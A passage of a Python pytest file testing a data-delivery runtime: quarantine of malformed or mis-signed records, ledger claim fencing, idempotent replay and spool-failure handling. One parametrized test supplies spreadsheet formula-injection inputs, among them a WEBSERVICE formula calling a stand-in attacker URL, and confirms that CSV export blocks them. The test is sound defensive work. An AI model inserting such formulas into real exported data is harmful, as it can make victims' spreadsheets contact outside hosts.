    )
    original = record.fields[0]
    envelope = seal_for_recipient(
        b'{"kind":"decimal","value":"NaN"}',
        RecipientKeyPair(runtime.agent.private_key).public_bytes(),
        original.context,
    )
    malicious = BlindTransportRecord(
        record.record_id,
        (SealedField(original.target_field_id, original.context, envelope),),
    ).signed(signer)

    receipt = runtime.deliver(malicious)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "transport_verification_failed"
    assert destination.calls == 0


@pytest.mark.parametrize(
    "value",
    ('=WEBSERVICE("https://attacker.invalid/x")', "+1+1", "-1+1", "@SUM(1+1)"),
)
def test_runtime_csv_export_blocks_spreadsheet_formula_injection(tmp_path, value) -> None:
    record, runtime, _ = _typed_runtime(tmp_path, value, DataType.STRING)
    output = tmp_path / "export.csv"
    runtime.connector = CsvConnector(output)

    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "write_not_committed"
    assert receipt.retry_safe
    assert not output.exists()


def test_runtime_rejects_null_for_required_mapped_target(tmp_path) -> None:
    record, runtime, destination = _typed_runtime(
        tmp_path,
        None,
        DataType.STRING,
        nullable=False,
    )

    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "destination_contract_failed"
    assert destination.calls == 0


def test_runtime_rejects_authenticated_wrong_field_set_before_write(tmp_path) -> None:
    record, runtime = _runtime(tmp_path, MemoryDestination())
    signer = SigningKeyPair.generate()
    assert runtime.agent.source_trust_store is not None
    runtime.agent.source_trust_store.add(
        TrustedSourceKey(signer.public_bytes(), record.tenant, record.source_connector)
    )
    original = record.fields[0]
    context = replace(original.context, field_id="unexpected")
    envelope = seal_for_recipient(
        PayloadCodec.encode("must-not-be-written"),
        RecipientKeyPair(runtime.agent.private_key).public_bytes(),
        context,
    )
    malformed = BlindTransportRecord(
        record.record_id,
        (SealedField("unexpected", context, envelope),),
    ).signed(signer)

    receipt = runtime.deliver(malformed)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "destination_contract_failed"
    assert runtime.connector.calls == 0
    assert runtime.ledger.get(malformed).state is DeliveryState.QUARANTINED


def test_runtime_rejects_authenticated_wrong_plan_id_before_write(tmp_path) -> None:
    record, runtime = _runtime(tmp_path, MemoryDestination())
    signer = SigningKeyPair.generate()
    assert runtime.agent.source_trust_store is not None
    runtime.agent.source_trust_store.add(
        TrustedSourceKey(signer.public_bytes(), record.tenant, record.source_connector)
    )
    original = record.fields[0]
    context = replace(original.context, plan_id="different-plan")
    envelope = seal_for_recipient(
        PayloadCodec.encode("must-not-be-written"),
        RecipientKeyPair(runtime.agent.private_key).public_bytes(),
        context,
    )
    malformed = BlindTransportRecord(
        record.record_id,
        (SealedField(original.target_field_id, context, envelope),),
    ).signed(signer)

    receipt = runtime.deliver(malformed)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "destination_contract_failed"
    assert runtime.connector.calls == 0


def test_unknown_write_outcome_is_sealed_and_not_blindly_retried(tmp_path):
    destination = FailAfterWriteDestination()
    record, runtime = _runtime(tmp_path, destination)

    result = runtime.deliver(record)
    assert result.status is DeliveryStatus.QUARANTINED
    assert result.reason_code == "write_outcome_unknown"
    assert runtime.ledger.get(record).state is DeliveryState.UNCERTAIN
    assert runtime.spool.get(record.digest()) is not None

    with pytest.raises(PolicyViolation):
        runtime.replay(record.digest())

    # Neither the spool nor ledger persist the plaintext token.
    for path in tmp_path.iterdir():
        if path.is_file():
            assert b"s3cr3t" not in path.read_bytes()


def test_prewrite_spool_failure_cannot_leave_terminal_ledger_state(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    record, runtime = _runtime(tmp_path, MemoryDestination())
    claim = runtime.ledger.claim(record)
    assert claim.claim_token is not None

    def fail_spool(*_args: object, **_kwargs: object) -> None:
        raise OSError("simulated sealed spool failure")

    monkeypatch.setattr(runtime.spool, "quarantine", fail_spool)

    with pytest.raises(OSError, match="sealed spool failure"):
        runtime._quarantine_before_write(record, "destination_contract_failed", claim.claim_token)

    entry = runtime.ledger.get(record)
    assert entry is not None
    assert entry.state is DeliveryState.CLAIMED


def test_stale_prewrite_quarantine_does_not_survive_replacement_commit(
    tmp_path: Path,
) -> None:
    clock = MutableClock()
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "stale-quarantine-ledger.db", clock=clock)
    stale = runtime.ledger.claim(record, lease_for=timedelta(seconds=1))
    assert stale.claim_token is not None
    clock.advance(timedelta(seconds=2))
    replacement = runtime.ledger.claim(record, lease_for=timedelta(minutes=1))
    assert replacement.claim_token is not None
    runtime.ledger.start_write(record, replacement.claim_token)
    runtime.ledger.mark_committed(record, replacement.claim_token)
    assert runtime.spool.get(record.digest()) is None

    receipt = runtime._quarantine_before_write(
        record,
        "destination_contract_failed",
        stale.claim_token,
    )

    assert receipt.status is DeliveryStatus.DUPLICATE
    assert not receipt.retry_safe
    assert runtime.ledger.get(record).state is DeliveryState.COMMITTED
    assert runtime.spool.get(record.digest()) is None


def test_stale_prewrite_reconciliation_reports_spool_cleanup_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    clock = MutableClock()
    record, runtime = _runtime(tmp_path, MemoryDestination())
    runtime.ledger = DeliveryLedger(tmp_path / "stale-cleanup-ledger.db", clock=clock)
    runtime.events = EventStream(tmp_path / "stale-cleanup-events.jsonl")
    stale = runtime.ledger.claim(record, lease_for=timedelta(seconds=1))
    assert stale.claim_token is not None
    clock.advance(timedelta(seconds=2))
    replacement = runtime.ledger.claim(record, lease_for=timedelta(minutes=1))
    assert replacement.claim_token is not None
    runtime.ledger.start_write(record, replacement.claim_token)
    runtime.ledger.mark_committed(record, replacement.claim_token)

    def fail_cleanup(_record_digest: str) -> bool:
        raise OSError("simulated sealed spool cleanup failure")

    monkeypatch.setattr(runtime.spool, "remove", fail_cleanup)
    receipt = runtime._quarantine_before_write(
        record,
        "destination_contract_failed",
        stale.claim_token,
    )

    assert receipt.status is DeliveryStatus.DUPLICATE
    assert receipt.reason_code == "sealed_spool_cleanup_failed"
    assert not receipt.retry_safe
    assert runtime.spool.get(record.digest()) is not None
    summary = runtime.events.summary()
    assert summary.event_contract_valid
    assert summary.reasons == {"sealed_spool_cleanup_failed": 1}


def test_committed_replay_reports_spool_cleanup_failure_without_retry_signal(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    record, runtime = _runtime(tmp_path, MemoryDestination())
    delivered = runtime.deliver(record)
    assert delivered.status is DeliveryStatus.DELIVERED
    runtime.spool.quarantine(record, "operator_reconciliation")
    runtime.events = EventStream(tmp_path / "committed-cleanup-events.jsonl")

    def fail_cleanup(_record_digest: str) -> bool:
        raise OSError("simulated sealed spool cleanup failure")

    monkeypatch.setattr(runtime.spool, "remove", fail_cleanup)
    replayed = runtime.replay(record.digest())

    assert replayed.status is DeliveryStatus.DUPLICATE
    assert replayed.reason_code == "sealed_spool_cleanup_failed"
    assert not replayed.retry_safe
    assert runtime.ledger.get(record).state is DeliveryState.COMMITTED
    assert runtime.spool.get(record.digest()) is not None
    summary = runtime.events.summary()
    assert summary.event_contract_valid
    assert summary.reasons == {"sealed_spool_cleanup_failed": 1}


@pytest.mark.parametrize(
    "destination_type",
    (KnownRollbackDestination, FailAfterWriteDestination),
)
def test_postwrite_spool_failure_cannot_leave_terminal_or_uncertain_ledger_state(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    destination_type,
) -> None:
    record, runtime = _runtime(tmp_path, destination_type())

    def fail_spool(*_args: object, **_kwargs: object) -> None:
        raise OSError("simulated sealed spool failure")

    monkeypatch.setattr(runtime.spool, "quarantine", fail_spool)

    with pytest.raises(OSError, match="sealed spool failure"):
        runtime.deliver(record)

    entry = runtime.ledger.get(record)
    assert entry is not None
    assert entry.state is DeliveryState.WRITE_STARTED


@pytest.mark.parametrize(
    ("destination_type", "transition_name"),
    (
        (KnownRollbackDestination, "mark_quarantined"),
        (FailAfterWriteDestination, "mark_uncertain"),
    ),
)
def test_postwrite_ledger_failure_keeps_the_previously_persisted_sealed_copy(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    destination_type,
    transition_name: str,
) -> None:
    record, runtime = _runtime(tmp_path, destination_type())

    def fail_ledger_transition(*_args: object, **_kwargs: object) -> None:
        assert runtime.spool.get(record.digest()) is not None
        raise IntegrityError("simulated ledger transition failure")

    monkeypatch.setattr(runtime.ledger, transition_name, fail_ledger_transition)

    with pytest.raises(IntegrityError, match="ledger transition failure"):
        runtime.deliver(record)

    entry = runtime.ledger.get(record)
    assert entry is not None
    assert entry.state is DeliveryState.WRITE_STARTED
    assert runtime.spool.get(record.digest()) is not None


def test_forced_uncertain_replay_requires_explicit_capability_authorizer(tmp_path) -> None:
    destination = FailAfterWriteDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.deliver(record)

    with pytest.raises(PolicyViolation, match="explicit capability authorizer"):
        runtime.replay(record.digest(), force_uncertain=True)

    assert destination.calls == 1
    assert runtime.ledger.get(record).state is DeliveryState.UNCERTAIN
    assert runtime.spool.get(record.digest()) is not None


def test_idempotent_destination_can_safely_replay_uncertain_delivery(tmp_path):
    destination = IdempotentFailOnceDestination()
    record, runtime = _runtime(tmp_path, destination)

    first = runtime.deliver(record)
    assert first.status is DeliveryStatus.QUARANTINED
    assert first.retry_safe
    entry = runtime.ledger.get(record)
    assert entry is not None
    assert entry.idempotency_contract_id == _SCALAR_IDEMPOTENCY_CONTRACT_ID

    replay = runtime.replay(record.digest())
    assert replay.status is DeliveryStatus.DELIVERED
    assert destination.calls == 2
    assert destination.records == [{"token": "s3cr3t"}]


def test_changed_idempotency_contract_cannot_replay_an_older_unknown_write(
    tmp_path: Path,
) -> None:
    destination = IdempotentFailOnceDestination()
    record, runtime = _runtime(tmp_path, destination)
    first = runtime.deliver(record)
    assert first.reason_code == "write_outcome_unknown"
    destination.capabilities = replace(
        destination.capabilities,
        idempotency_contract_id="tests.memory.scalar-write/v2",
    )

    with pytest.raises(PolicyViolation, match="idempotency"):
        runtime.replay(record.digest())

    assert destination.calls == 1
    entry = runtime.ledger.get(record)
    assert entry is not None
    assert entry.idempotency_contract_id == _SCALAR_IDEMPOTENCY_CONTRACT_ID


def test_legacy_null_contract_cannot_replay_an_unknown_write(tmp_path: Path) -> None:
    destination = IdempotentFailOnceDestination()
    record, runtime = _runtime(tmp_path, destination)
    first = runtime.deliver(record)
    assert first.reason_code == "write_outcome_unknown"
    with runtime.ledger._connect() as connection:
        connection.execute(
            "UPDATE deliveries SET idempotency_contract_id = NULL WHERE record_digest = ?",
            (record.digest(),),
        )

    with pytest.raises(PolicyViolation, match="idempotency"):
        runtime.replay(record.digest())

    assert destination.calls == 1
    entry = runtime.ledger.get(record)
    assert entry is not None
    assert entry.idempotency_contract_id is None


def test_scalar_replay_capability_downgrade_after_rearm_stops_before_write(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = IdempotentFailOnceDestination()
    record, runtime = _runtime(tmp_path, destination)
    first = runtime.deliver(record)
    assert first.reason_code == "write_outcome_unknown"
    original_rearm = runtime.ledger.rearm_for_retry

    def rearm_then_downgrade(*args, **kwargs):
        rearmed = original_rearm(*args, **kwargs)
        destination.capabilities = ConnectorCapabilities(write_records=True)
        return rearmed

    monkeypatch.setattr(runtime.ledger, "rearm_for_retry", rearm_then_downgrade)

    receipt = runtime.replay(record.digest())

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "replay_capability_changed"
    assert not receipt.retry_safe
    assert destination.calls == 1
    entry = runtime.ledger.get(record)
    assert entry is not None
    assert entry.state is DeliveryState.REPLAY_QUARANTINED
    assert entry.idempotency_contract_id == _SCALAR_IDEMPOTENCY_CONTRACT_ID


def test_scalar_unknown_receipt_uses_the_prewrite_idempotency_snapshot(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = IdempotentFailOnceDestination()
    record, runtime = _runtime(tmp_path, destination)
    original_write = destination.write_records

    def write_then_downgrade(records, *, context=None):
        try:
            return original_write(records, context=context)
        finally:
            destination.capabilities = ConnectorCapabilities(write_records=True)

    monkeypatch.setattr(destination, "write_records", write_then_downgrade)

    receipt = runtime.deliver(record)

    assert receipt.reason_code == "write_outcome_unknown"
    assert receipt.retry_safe
    assert not destination.capabilities.supports_idempotency
    entry = runtime.ledger.get(record)
    assert entry is not None
    assert entry.idempotency_contract_id == _SCALAR_IDEMPOTENCY_CONTRACT_ID


def test_scalar_unknown_outcome_uses_the_prewrite_capability_snapshot(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)

    def write_then_upgrade(records, *, context=None):
        destination.calls += 1
        destination.records.extend(list(records))
        destination.capabilities = ConnectorCapabilities(
            write_records=True,
            supports_idempotency=True,
            idempotency_contract_id="tests.memory.post-write-scalar-upgrade/v1",
        )
        raise RuntimeError("simulated lost acknowledgement during capability change")

    monkeypatch.setattr(destination, "write_records", write_then_upgrade)

    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "write_outcome_unknown"
    assert not receipt.retry_safe
    assert destination.capabilities.supports_idempotency
    entry = runtime.ledger.get(record)
    assert entry is not None
    assert entry.state is DeliveryState.UNCERTAIN
    assert entry.idempotency_contract_id is None
    with pytest.raises(PolicyViolation, match="idempotency"):
        runtime.replay(record.digest())
    assert destination.calls == 1


@pytest.mark.parametrize("acknowledgement", (True, 1.0))
def test_scalar_write_rejects_a_non_plain_integer_acknowledgement(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    acknowledgement: object,
) -> None:
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)

    def write_with_non_integer_ack(records, *, context=None) -> object:
        destination.calls += 1
        destination.records.extend(list(records))
        return acknowledgement

    monkeypatch.setattr(destination, "write_records", write_with_non_integer_ack)

    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "write_outcome_unknown"
    assert not receipt.retry_safe
    assert runtime.ledger.get(record).state is DeliveryState.UNCERTAIN


def test_known_not_committed_write_is_safe_to_replay(tmp_path) -> None:
    from polymorph.errors import ConnectorWriteError, WriteOutcome

    class KnownRollbackConnector(MemoryDestination):
        def __init__(self) -> None:
            super().__init__()
            self.fail_once = True

        def write_records(self, records, *, context=None):
            if self.fail_once:
                self.fail_once = False
                raise ConnectorWriteError(
                    "rolled back",
                    outcome=WriteOutcome.NOT_COMMITTED,
                )
            return super().write_records(records, context=context)

    connector = KnownRollbackConnector()
    transport, runtime = _runtime(tmp_path, connector)
    receipt = runtime.deliver(transport)
    assert receipt.reason_code == "write_not_committed"
    assert receipt.retry_safe is True
    assert runtime.ledger.get(transport).state is DeliveryState.QUARANTINED
    runtime.audit = AuditLog(tmp_path / "replay-audit.db")
    replayed = runtime.replay(transport.digest(), force_uncertain=True)
    assert replayed.status is DeliveryStatus.DELIVERED
    assert len(connector.records) == 1
    assert runtime.ledger.get(transport).state is DeliveryState.COMMITTED
    assert runtime.audit.summary().event_types == {"replay": 1}


def test_json_limit_rejection_is_not_marked_as_an_uncertain_write(tmp_path) -> None:
    path = tmp_path / "destination.json"
    connector = JsonFileConnector(path, max_json_items=2)
    assert connector.write_records([{"token": "already-committed"}]) == 1
    committed = path.read_bytes()
    record, runtime = _runtime(tmp_path, connector)

    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "write_not_committed"
    assert receipt.retry_safe
    assert runtime.ledger.get(record).state is DeliveryState.QUARANTINED
    assert runtime.spool.get(record.digest()) is not None
    assert path.read_bytes() == committed


def test_validly_signed_malformed_payload_is_quarantined_without_write(tmp_path) -> None:
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    signer = SigningKeyPair.generate()
    assert runtime.agent.source_trust_store is not None
    runtime.agent.source_trust_store.add(
        TrustedSourceKey(signer.public_bytes(), record.tenant, record.source_connector)
    )
    field = record.fields[0]
    malformed_envelope = seal_for_recipient(
        b"not-json",
        RecipientKeyPair(runtime.agent.private_key).public_bytes(),
        field.context,
    )
    malformed = BlindTransportRecord(
        record.record_id,
        (SealedField(field.target_field_id, field.context, malformed_envelope),),
    ).signed(signer)

    receipt = runtime.deliver(malformed)

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "transport_verification_failed"
    assert destination.calls == 0
    assert runtime.ledger.get(malformed).state is DeliveryState.QUARANTINED
    assert runtime.spool.get(malformed.digest()) is not None


def test_expired_prewrite_claim_is_recovered_and_delivered_once(tmp_path) -> None:
    clock = MutableClock()
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    runtime.claim_lease = timedelta(seconds=30)

    abandoned = runtime.ledger.claim(record, lease_for=runtime.claim_lease)
    assert abandoned.disposition is ClaimDisposition.NEW
    assert abandoned.claim_token is not None

    clock.advance(timedelta(seconds=31))
    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.DELIVERED
    assert destination.calls == 1
    assert destination.records == [{"token": "s3cr3t"}]
    assert runtime.ledger.get(record).state is DeliveryState.COMMITTED


def test_active_prewrite_claim_is_not_stolen_or_quarantined(tmp_path) -> None:
    clock = MutableClock()
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    runtime.claim_lease = timedelta(minutes=1)
    runtime.ledger.claim(record, lease_for=runtime.claim_lease)

    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.AMBIGUOUS
    assert receipt.reason_code == "delivery_claim_in_progress"
    assert not receipt.retry_safe
    assert destination.calls == 0
    assert runtime.spool.get(record.digest()) is None
    assert runtime.ledger.get(record).state is DeliveryState.CLAIMED


def test_rearm_cannot_steal_active_claim_and_atomically_fences_expired_token(
    tmp_path: Path,
) -> None:
    clock = MutableClock()
    record, runtime = _runtime(tmp_path, MemoryDestination())
    runtime.ledger = DeliveryLedger(tmp_path / "rearm-fence-ledger.db", clock=clock)
    lease_for = timedelta(seconds=5)
    first = runtime.ledger.claim(record, lease_for=lease_for)
    assert first.claim_token is not None
    runtime.spool.quarantine(record, "operator_recovery")

    with pytest.raises(IntegrityError, match="active delivery claim"):
        runtime.ledger.rearm_for_retry(
            record,
            expected_state=DeliveryState.CLAIMED,
            lease_for=lease_for,
        )
    still_active = runtime.ledger.get(record)
    assert still_active is not None
    assert still_active.claim_token == first.claim_token
    assert still_active.state is DeliveryState.CLAIMED

    clock.advance(timedelta(seconds=6))
    replacement = runtime.ledger.rearm_for_retry(
        record,
        expected_state=DeliveryState.CLAIMED,
        lease_for=lease_for,
    )
    assert replacement.claim_token is not None
    assert replacement.claim_token != first.claim_token
    assert replacement.state is DeliveryState.REPLAY_CLAIMED
    with pytest.raises(IntegrityError, match="state transition"):
        runtime.ledger.start_replay_write(record, first.claim_token)
    runtime.ledger.start_replay_write(record, replacement.claim_token)
    assert runtime.ledger.get(record).state is DeliveryState.REPLAY_WRITE_STARTED


def test_replaced_claim_fences_stale_worker_before_destination_write(tmp_path) -> None:
    clock = MutableClock()
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    runtime.claim_lease = timedelta(seconds=20)

    stale = runtime.ledger.claim(record, lease_for=runtime.claim_lease)
    assert stale.claim_token is not None
    clock.advance(timedelta(seconds=21))
    replacement = runtime.ledger.claim(record, lease_for=runtime.claim_lease)
    assert replacement.disposition is ClaimDisposition.RECOVERED
    assert replacement.claim_token is not None
    assert replacement.claim_token != stale.claim_token

    stale_result = runtime._deliver_claimed(
        record,
        stale.claim_token,
        authorized_capabilities=runtime.connector.capabilities,
    )
    assert stale_result.status is DeliveryStatus.AMBIGUOUS
    assert stale_result.reason_code == "delivery_claim_lost"
    assert destination.calls == 0

    replacement_result = runtime._deliver_claimed(
        record,
        replacement.claim_token,
        authorized_capabilities=runtime.connector.capabilities,
    )
    assert replacement_result.status is DeliveryStatus.DELIVERED
    assert destination.calls == 1


def test_write_started_claim_is_never_recovered_by_elapsed_time(tmp_path) -> None:
    clock = MutableClock()
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    runtime.claim_lease = timedelta(seconds=10)

    claim = runtime.ledger.claim(record, lease_for=runtime.claim_lease)
    assert claim.claim_token is not None
    runtime.ledger.start_write(record, claim.claim_token)
    clock.advance(timedelta(days=7))

    repeated = runtime.ledger.claim(record, lease_for=runtime.claim_lease)
    assert repeated.disposition is ClaimDisposition.AMBIGUOUS
    assert repeated.state is DeliveryState.WRITE_STARTED

    receipt = runtime.deliver(record)
    assert receipt.status is DeliveryStatus.AMBIGUOUS
    assert receipt.reason_code == "previous_write_started_ambiguous"
    assert destination.calls == 0
    assert runtime.spool.get(record.digest()) is not None

    with pytest.raises(PolicyViolation, match="idempotency"):
        runtime.replay(record.digest())
    assert destination.calls == 0


def test_crash_after_destination_commit_does_not_trigger_blind_second_write(
    tmp_path,
    monkeypatch,
) -> None:
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)

    def crash_before_outcome(*_args: object, **_kwargs: object) -> None:
        raise SystemExit("simulated process death")

    monkeypatch.setattr(runtime.ledger, "mark_committed", crash_before_outcome)
    with pytest.raises(SystemExit, match="simulated process death"):
        runtime.deliver(record)

    assert destination.calls == 1
    assert destination.records == [{"token": "s3cr3t"}]
    assert runtime.ledger.get(record).state is DeliveryState.WRITE_STARTED

    receipt = runtime.deliver(record)
    assert receipt.status is DeliveryStatus.AMBIGUOUS
    assert receipt.reason_code == "previous_write_started_ambiguous"
    assert destination.calls == 1


def test_write_started_recovery_requires_explicit_force_capability(tmp_path) -> None:
    clock = MutableClock()
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    claim = runtime.ledger.claim(record)
    assert claim.claim_token is not None
    runtime.ledger.start_write(record, claim.claim_token)
    runtime.deliver(record)

    with pytest.raises(PolicyViolation, match="explicit capability authorizer"):
        runtime.replay(record.digest(), force_uncertain=True)

    signer = SigningKeyPair.generate()
    replay_only = CapabilityGrant.issue(
        issuer="operator",
        subject=runtime.actor_id,
        tenant=record.tenant,
        connector_id=runtime.connector_id,
        operations=(CapabilityOperation.REPLAY,),
        allowed_plan_digests=(record.plan_digest,),
    )
    runtime.authorizer = CapabilityAuthorizer(
        SignedCapabilityGrant.sign(replay_only, signer),
        signer.public_bytes(),
        subject=runtime.actor_id,
        expected_issuer="operator",
    )
    with pytest.raises(PolicyViolation, match="force_uncertain_replay"):
        runtime.replay(record.digest(), force_uncertain=True)

    grant = CapabilityGrant.issue(
        issuer="operator",
        subject=runtime.actor_id,
        tenant=record.tenant,
        connector_id=runtime.connector_id,
        operations=(
            CapabilityOperation.REPLAY,
            CapabilityOperation.FORCE_UNCERTAIN_REPLAY,
        ),
        allowed_plan_digests=(record.plan_digest,),
    )
    runtime.authorizer = CapabilityAuthorizer(
        SignedCapabilityGrant.sign(grant, signer),
        signer.public_bytes(),
        subject=runtime.actor_id,
        expected_issuer="operator",
    )
    runtime.audit = AuditLog(tmp_path / "audit.db")

    receipt = runtime.replay(record.digest(), force_uncertain=True)
    assert receipt.status is DeliveryStatus.DELIVERED
    assert destination.calls == 1
    assert runtime.audit.summary().event_types == {"force_replay": 1}


def test_legacy_unfenced_claim_fails_closed(tmp_path) -> None:
    clock = MutableClock()
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    runtime.ledger.claim(record)
    with runtime.ledger._connect() as connection:
        connection.execute("UPDATE deliveries SET claim_token = NULL, claim_expires_at = NULL")

    clock.advance(timedelta(days=30))
    receipt = runtime.deliver(record)

    assert receipt.status is DeliveryStatus.AMBIGUOUS
    assert receipt.reason_code == "previous_delivery_ambiguous"
    assert destination.calls == 0
    assert runtime.ledger.get(record).state is DeliveryState.CLAIMED
    assert runtime.spool.get(record.digest()) is not None


def test_claim_transition_rejects_expired_and_wrong_fence_tokens(tmp_path) -> None:
    clock = MutableClock()
    record, _, _, _ = _transport()
    ledger = DeliveryLedger(tmp_path / "ledger.db", clock=clock)
    claim = ledger.claim(record, lease_for=timedelta(seconds=5))
    assert claim.claim_token is not None

    with pytest.raises(IntegrityError, match="state transition"):
        ledger.start_write(record, "attacker-token")

    clock.advance(timedelta(seconds=6))
    with pytest.raises(IntegrityError, match="state transition"):
        ledger.start_write(record, claim.claim_token)
    assert ledger.get(record).state is DeliveryState.CLAIMED
